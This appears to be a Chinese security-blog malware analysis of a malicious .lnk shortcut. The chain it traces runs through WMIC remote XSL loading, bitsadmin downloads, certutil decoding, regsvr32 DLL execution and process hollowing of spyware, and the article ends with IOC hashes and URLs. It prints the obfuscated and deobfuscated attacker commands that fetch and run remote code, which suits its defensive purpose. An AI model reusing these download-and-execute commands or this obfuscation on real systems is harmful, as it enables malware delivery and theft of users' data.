***严正声明：本文仅限于技术讨论与分享，严禁用于非法途径。**

## 一、背景

 **最近捕获到一枚恶意lnk，双击之后会触发后续的攻击链，执行流程如下图所示。**

![1561630412_5d1496cce16ed.png!small](https://image.3001.net/images/20190627/1561630412_5d1496cce16ed.png!small)

## 二、详细分析

双击lnk后会调用cmd执行被混淆后的脚本

    
    
    "C:\Windows\system32\cmd.exe"  /V /D /C start /MIN C:\Windows\system32\cmd.exe /V /D /C "set 7taLrmr=C-mb:-mb\-mb\-mbW-mbi-mbnd-mbow-mbs\-mb\s-mbys-mbt-mbe-mbm-mb3-mb2-mb\-mb\-mbw-mbb-mbe-mbm\-mb\W-mbM-mbI-mbC.e-mbx-mbe o-mbs g-mbe-mbt n-mbc-mbb-mbj-mb5-mbg-mbt-mbd-mbU-mb, 8-mbd-mbU-mbH-mbn-mbx-mbi-mb, M-mba-mbx-mbP-mbr-mbo-mbc-mbe-mbs-mbs-mbM-mbe-mbm-mbo-mbr-mby-mbS-mbi-mbz-mbe-mb /-mbfo-mbrm-mbat:"h-mbt-mbt-mbp-mb:-mb/-mb/s-mbt-mbo-mbr-mba-mbg-mbe-mb.-mbg-mbo-mbo-mbg-mbl-mbe-mba-mbp-mbi-mbs-mb.-mbc-mbo-mbm-mb:-mb8-mb0-mb/-mba-mbr-mby-mbw-mba-mbf-mb/-mb0-mb8-mb/-mbv-mb.-mbt-mbx-mbt-mb#-mb0-mb2-mb5-mb0-mb1-mb3-mb6-mbg-mbk-mbd-mbY-mbJ-mbm-mbm-mbu-mb" &&start /MIN cmd /V /C %7taLrmr:-mb=%"

去混淆后如下

    
    
    "C:\Windows\system32\cmd.exe  /V /D /C "set 7taLrmr=C:\\Windows\\system32\\wbem\\WMIC.exe os get ncbj5gtdU, 8dUHnxi, MaxProcessMemorySize /format:"http://storage.googleapis.com:80/arywaf/08/v.txt#0250136gkdYJmmu" &&start /MIN cmd /V /C 7taLrmr"

调用wmic执行远程xsl脚本，v.txt脚本如图所示

![1561624624_5d1480301471e.png!small](https://image.3001.net/images/20190627/1561624624_5d1480301471e.png!small)拼接字符串，调用WScript.Shell执行命令，解出来之后的命令如下

    
    
    WMIC.exe os get CAENHNWH, AYNYLSNT, VCKKSBZF, lastbootupdate /format:"http://storage.googleapis.com:80/arywaf/08/vv.txt#7312017

继续执行远程xsl脚本，vv.txt脚本如下图所示

![1561626004_5d148594ea74d.png!small](https://image.3001.net/images/20190627/1561626004_5d148594ea74d.png!small)

拼接字符串，调用bitsadmin.exe从远程服务器将加密后的文件下载到C:\Users\Public\Libraries\ldpwaf目录下，接着调用certutil.exe在本地解密该文件，命令如下

    
    
    "C:\Windows\System32\bitsadmin.exe" /transfer msd5 /priority foreground hxxp://storage.googleapis.com/arywaf/x/08/ayt3ese4xwa.jpg.zip.log?629161959 C:\Users\Pubalic\Libraries\ldpwaf\ayt3ese4xwa.jpg.z
    
    
    "C:\Windows\System32\certutil.exe" -decode C:\Users\Public\Libraries\ldpwaf\ayt3ese4xwa.jpg.z C:\Users\Public\Libraries\ldpwaf\ayt3ese4xwa.jpg'

该过程重复12次，加密后的文件和解密后的文件如图所示

![1561626815_5d1488bfb43f3.png!small](https://image.3001.net/images/20190627/1561626815_5d1488bfb43f3.png!small)

当下载和解密完成之后，会调用cmd将两个解密后的dll文件拼接到一起

    
    
    "C:\Windows\System32\cmd.exe" /c cd "C:\Users\Public\Libraries\ldpwaf" && type ayt3ese4xw64a.dll ayt3ese4xw64b.dll > ayt3ese4xw64.dll

生成完整的Dll之后，调用regsvr32启动该Dll，如下

    
    
    "C:\Windows\System32\cmd.exe" /c regsvr32.exe "C:\Users\Public\Libraries\ldpwaf\ayt3ese4xw64.dll" && exit

ayt3ese4xw64.dll由Delphi语言编写，作为一个loader调用后续模块，VT报毒情况如下

![1561627529_5d148b894ba6d.png!small](https://image.3001.net/images/20190627/1561627529_5d148b894ba6d.png!small)

会首先载入之前已经解密的ayt3ese4xw98.~文件实际是一个Dll，并获得其中的一个导出函数vkt的地址

![1561627881_5d148ce9cc7ce.png!small](https://image.3001.net/images/20190627/1561627881_5d148ce9cc7ce.png!small)

vkt函数后续用于内存加载，接着会载入ayt3ese4xwxa.~和ayt3ese4xwxb.~两个文件，载入到内存之后进行拼接，拼成一个PE文件。

![1561628212_5d148e341a45a.png!small](https://image.3001.net/images/20190627/1561628212_5d148e341a45a.png!small)

将拼接后的PE地址入栈，调用vkt函数进行内存加载

![1561628359_5d148ec74be3c.png!small](https://image.3001.net/images/20190627/1561628359_5d148ec74be3c.png!small)

vkt反编译如下

![1561628767_5d14905f8d177.png!small](https://image.3001.net/images/20190627/1561628767_5d14905f8d177.png!small)该PE会将ayt3ese4xwgx.gif加载到内存中，并创建一个挂起的进程userinit.exe

![1561629208_5d1492187bd08.png!small](https://image.3001.net/images/20190627/1561629208_5d1492187bd08.png!small)

解密ayt3ese4xwgx.gif，将其写入到挂起的userinit.exe内存空间中，准备进程替换

![1561629369_5d1492b9afdc5.png!small](https://image.3001.net/images/20190627/1561629369_5d1492b9afdc5.png!small)而ayt3ese4xwgx.gif实际使用Delphi开源类库JWSCL编写的一款监控软件

![1561630170_5d1495dabe799.png!small](https://image.3001.net/images/20190627/1561630170_5d1495dabe799.png!small)

在dump下来的ayt3ese4xwgx.gif中，字符串列表如下

![1561631092_5d149974beb4b.png!small](https://image.3001.net/images/20190627/1561631092_5d149974beb4b.png!small)调用了JWSCL库很多模块。除此之外还会访问sstatic1.histats.com/0.gif?4253051&101用来统计感染人数，还会访问以下资源，可能用于后续攻击，根据名称判断可能是ddos模块

    
    
    storage.googleapis.com/8tx141radx138/8/dados.txt  
    storage.googleapis.com/tx141radx138/8/dados.txt  
    storage.googleapis.com/carbon-syntax-605.appspot.com/138/8/dados.txt  
    storage.googleapis.com/1tx141radx138/8/dados.txt

截止到分析时该路径无法访问。接着会内存加载ayt3ese4xwgx.gif，以上述同样的方式启动傀儡进程scvhost，将解密后的ayt3ese4xwc.jpg替换到傀儡进程中，ayt3ese4xwc.jpg主要是spy类的软件，收集用户敏感信息。

## 三、关联分析

通过开源威胁情报可知，该服务器上曾经有如下恶意样本

    
    
    08A105599F42E8AF2768E2E1BE368864
    3798527BDC8284309EA30DAF661B01EE
    403D9B1A5548FE573407EB46A275EB4A
    2D130C204F3F19C2B0C107205676B3D3
    D87F515B9632DA3330AAA8DF54F67E16
    271C6B21CADF0FE060C1BBA968F45132
    A94DA8F4BC06FB32E047D3839464C5F0
    5BA336536818F9BB2A0278996EEE2F66
    A6CCC9554069D9B0A4F930E9DBEF3952
    6475F9AC6B9C97483DCACCCB88414AA2
    8C51ED73FBD763600448783EE44397B1
    1CE91942793586025B540DA4DF4FC11A
    0738618836BCE4B7075382A59EDDF28D
    A01970F5753691280BE5EA035FAD5497
    8CFCE534ECFD7382D57CFC436F64D123
    50320C83ACB3398CC723D9F7844BA3C9
    256060D2F8E4EF0F78FB37FF505145C2
    84B1D262043DC486020059EE8649E3A9
    E8458064C18E32DD51BD6108A8725BFA
    A7F944D5FE38D6AD552F921971EE8DDB

通过VT关联分析，该团伙除了投放上述分析的lnk，还投放了与其类似的两个lnk样本

    
    
    69b42fe677e93738fae851f3e4e1ac8d
    10d907e7a74ef3ca0de35dab3b61a43c
    

值得注意的是在xsl脚本vv.txt中有些定义的对象和变量并没有被引用，在后期下载的众多jpg模块也没有被完全调用。结合时间轴来判断26日该样本上传到VT上，28日相关域名访问不上，可以大致判断黑客在测试样本。

28日时又检测到一批名为Optima_xxx_xxx_xxx.xlsm的样本被上传到VT上，
这批样本同样跟storage.googleapis.com有关，免杀效果如图所示

![xlsm.png](https://image.3001.net/images/20190628/1561710359_5d15cf1773623.png!small)免杀效果很好，怀疑同样是在测试样本，不排除后期会发起大规模攻击

## 四、IOC

    
    
    MD5:
    358d7846094d679a3044e3692cd7f32b
    10d907e7a74ef3ca0de35dab3b61a43c
    F66690DB1899EEB5B06D5E8442068B6F
    1E0EBB4DA99F83C665F873B57B7FFE70
    22189F7E9AC83AE8BCF7B3AAB1D844E8
    2306BF104EE64134E4ADBA23533D5F15
    E737EEFF10574F8E3A3C3CC8368BFC44
    C82B2F747EED46F902ABB9B2A1478D1D
    64C9AE5FA8F9F574DBED6D8DC02899CD
    57BBFB7DFBD710AAEF209BFF71B08A32
    A12B65658AAEA85294951D44E1C1B937
    9EE5D2555B3912713DBB6EAEEBF0BD15
    2A4AFC4A05487D5C41A08B03AA09C60B
    2D37486F0CC15D41BE865C6F36F39117
    BCA0E5DF11FFC0EC05054BF2A71BE2B5
    93D6B5855DA119EF7120E146C1F78516
    9300F89C6ACA80D8877E7ADDA236E89D
    A7845EEA4AE9E7EB098B4F615127EFC6
    FAE3AE489F3903CDB90179E89E0C24C7
    E8D3012B67C643D7C20744DD303D0016
    B47F900E83930FCA6306D68BFCA04CF0
    C92CA1EDA0D249C75CC87934F7FE9B88
    8C19F72AE4E0B1E99BB2BFC1EC27ED58
    BC5746873A5893D18DC029E192F217AD
    D2812D248198C77C9303C4CF391D6770
    56834F1454B134E3A6E19153A8166874
    URL:
    storage.googleapis.com/arywaf/08/v.txt
    storage.googleapis.com/arywaf/08/vv.txt
    jornalskn.pw//08/?0141
    lwajmu4kawa.sistemaap.xyz/8//
    sstatic1.histats.com/0.gif?4253051&101
    storage.googleapis.com/3tx141radx138/8/dados.txt
    storage.googleapis.com/8tx141radx138/8/dados.txt
    storage.googleapis.com/tx141radx138/8/dados.txt
    storage.googleapis.com/carbon-syntax-605.appspot.com/138/8/dados.txt
    storage.googleapis.com/1tx141radx138/8/dados.txt
    storage.googleapis.com/arywaf/x/08/ayt3ese4xwa.jpg.zip.log?629161959
    storage.googleapis.com/arywaf/x/08/ayt3ese4xwb.jpg.zip.log?835026482
    storage.googleapis.com/arywaf/x/08/ayt3ese4xwc.jpg.zip.log?113093340
    storage.googleapis.com/arywaf/x/08/ayt3ese4xwdwwn.gif.zip.log?84645238
    storage.googleapis.com/arywaf/x/08/ayt3ese4xwdx.gif.zip.log?385951048
    storage.googleapis.com/arywaf/x/08/ayt3ese4xwg.gif.zip.log?661196134
    storage.googleapis.com/arywaf/x/08/ayt3ese4xwgx.gif.zip.log?875991307
    storage.googleapis.com/arywaf/x/08/ayt3ese4xwxa.gif.zip.log?206445912
    storage.googleapis.com/arywaf/x/08/ayt3ese4xwxb.gif.zip.log?114972411
    storage.googleapis.com/arywaf/x/08/ayt3ese4xw986.dll.zip.log?777041210
    storage.googleapis.com/arywaf/x/08/ayt3ese4xwhh8a.dll.zip.log?479374296
    storage.googleapis.com/arywaf/x/08/ayt3ese4xwhh8b.dll.zip.log?687264835
    

***本文作者：xencounter，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

